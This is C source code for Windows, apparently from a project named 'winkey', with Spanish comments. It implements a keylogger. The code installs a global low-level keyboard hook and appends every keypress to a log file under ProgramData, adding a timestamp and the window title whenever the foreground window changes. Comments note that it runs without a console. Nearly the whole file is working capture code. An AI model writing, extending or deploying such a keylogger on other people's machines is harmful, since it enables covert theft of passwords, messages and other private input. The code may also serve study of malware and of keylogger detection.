#include "winkey.h"

// Variable global para el hook
static HHOOK g_hHook = NULL;
FILE* logFile = NULL;

// Funcion para crear/abrir archivo de log
BOOL CreateLogFile(void)
{
    WCHAR path[MAX_PATH];
    // Obtener la ruta a "C:\ProgramData" del usuario
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) {
        // Concatenar el nombre del archivo de log
        wcscat_s(path, MAX_PATH, L"\\Winkey.log");
        // convertir la ruta WCHAR a char para fopen_s
        char finalPath_mb[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, path, -1, finalPath_mb, sizeof(finalPath_mb), NULL, NULL);

        errno_t err = fopen_s(&logFile, finalPath_mb, "a"); // Usar "a" (append) para no borrar en cada reinicio
        if (err != 0 || !logFile) {
            // No usar printf aquí porque no hay consola
            return FALSE;
        }
        return TRUE;
    }

    // Fallback por si no se puede obtener la ruta de documentos
    errno_t err = fopen_s(&logFile, "winkey_fallback.log", "a");
    if (err != 0 || !logFile) {
        return FALSE;
    } 
    return TRUE;
}

// Funcion que se ejecuta cada vez que se pulsa una tecla
LRESULT CALLBACK LowLevelKeyboardProc(
    int nCode,	// Estado del hook (debe ser HC_ACTION para actuar) 
    WPARAM wParam, // Tipo de evento: tecla presionada (WM_KEYDOWN)
    LPARAM lParam) // Info sobre la tecla (estructura) 
{
    // Variable estatica para recordar la ultima ventana activa (Handle to windows)
    static HWND lastHwnd = NULL;

    if (nCode == HC_ACTION) {
        // Procesar y escribir la tecla
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = p->vkCode;  // Código virtual de la tecla

        // --- Solución robusta para CAPS LOCK ---
        static BOOL capsLockWasDown = FALSE;
        if (vkCode == VK_CAPITAL) {
            if (wParam == WM_KEYDOWN) {
                if (!capsLockWasDown) {
                    capsLockWasDown = TRUE;
                    // Solo procesar el flanco de subida (primera vez que se pulsa)
                } else {
                    // Ya estaba pulsado, ignorar duplicados
                    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
                }
            } else if (wParam == WM_KEYUP) {
                capsLockWasDown = FALSE;
                // No procesar nada en el flanco de bajada
                return CallNextHookEx(g_hHook, nCode, wParam, lParam);
            } else {
                // Otros eventos, ignorar
                return CallNextHookEx(g_hHook, nCode, wParam, lParam);
            }
        }

        // Solo procesar eventos de tecla presionada
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // 1. Obtener la ventana actual
            HWND currentHwnd = GetForegroundWindow();
            
            // Comprobar si la ventana ha cambiado
            if (currentHwnd != lastHwnd) {
                // Actualizamos la ventana
                lastHwnd = currentHwnd;

                // Obtenemos el titulo de la ventana
                WCHAR windowTitle[256];
                GetWindowTextW(currentHwnd, windowTitle, 256);

                // obtener el timestamp
                time_t t = time(NULL);
                struct tm tm_info;
                localtime_s(&tm_info, &t);
                char timeString[30];
                strftime(timeString, sizeof(timeString), "%d.%m.%Y %H:%M:%S", &tm_info);

                // Escribir la cabezera en el log
                if (logFile) {
                    // Convertir el titulo de WCHAR a char par fprintf
                    char title_mb[256];
                    WideCharToMultiByte(CP_UTF8, 0, windowTitle, -1, title_mb, sizeof(title_mb), NULL, NULL);
                    fprintf(logFile, "\n\n[%s] - '%s'\n", timeString, title_mb);
                    fflush(logFile);
                }
            }

            // --- Obtener el Idioma que se esta usando ---
            // Obtener el HILO de la ventana activa para saber su distribución de teclado
            DWORD threadId = GetWindowThreadProcessId(currentHwnd, NULL);
            // Obtener la distribución de teclado (Qwerty, azerty, etc) de ese hilo
            HKL keyboardLayout = GetKeyboardLayout(threadId);
            // --- Fin de obtener el idioma ---

            // Funcion para obtener el caracter o nombre de la tecla
            char* keyChar = VirtualKeyToChar(vkCode, p->scanCode, keyboardLayout);

            // Ver en terminal las teclas pulsadas ejecutando winkey.exe 
            //printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
            //printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);

            // crear archivo si no existe
            if (logFile) {
                fprintf(logFile, "%s", keyChar);
                fflush(logFile); //Forzar escritura inmediata
            }
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// Activar hook
BOOL ActivateHook(void)
{
    // Crear archivo de log
    if (!CreateLogFile()) {
        return FALSE;
    }

    // Activar el hook
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hHook) {
        printf("Error to create the hook\n");
        return FALSE;
    }
    return TRUE;
}

void DeactivateHook(void)
{
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
        printf("Hook desactivado.\n");
    }

    // Cerrar archivo
    if (logFile) {
        fclose(logFile);
        logFile = NULL;
    }
}